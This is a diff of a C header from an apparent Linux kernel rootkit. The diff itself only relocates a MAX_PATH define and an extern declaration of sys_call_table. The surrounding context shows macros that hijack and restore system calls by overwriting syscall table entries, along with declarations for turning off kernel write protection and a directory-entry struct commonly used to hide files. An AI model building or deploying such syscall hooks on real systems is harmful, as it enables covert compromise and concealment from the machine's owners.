@@ -17,6 +17,7 @@
 #include <asm/bitops.h> /* set_bit clear_bit */
 
 #define DEBUG
+#define MAX_PATH 1020
 
 #ifdef DEBUG  
 # define DLog(fmt, ... ) printk(("Rootkit:%s-[%s]:%d " fmt "\n"), __FILE__, __FUNCTION__, __LINE__, ##__VA_ARGS__);  
@@ -24,19 +25,12 @@
 # define DLog(...);  
 #endif  
 
-#define MAX_PATH 1020
-
 #ifndef __AVOID_NULL__
 #define __AVOID_NULL__
-
 #define AvoidNull(call, args1) {\
 if(args1) call(args1);\
 }
-
 #endif 
-
-extern unsigned long **sys_call_table;
-
 
 // define a struct to save system call
 #define RT_SYSCALL_DEFINE(ret, name, args...) \
@@ -59,8 +53,6 @@ sys_call_table[__NR_##name] = (void *)(rt_sys_##name);\
 #define RT_SYSCALL_RESTORE(name) {\
 sys_call_table[__NR_##name] = (void *)(orig_sys_##name.val);\
 }
-
-
 
 // define a struct to save system call
 #define RT_SYSCALL_DEFINE_JMP(ret, name, args...) \
@@ -106,6 +98,7 @@ struct linux_dirent {
     char d_name[1];
 };
 
+extern unsigned long **sys_call_table;
 
 void disable_write_protection(void);
 void enable_write_protection(void);
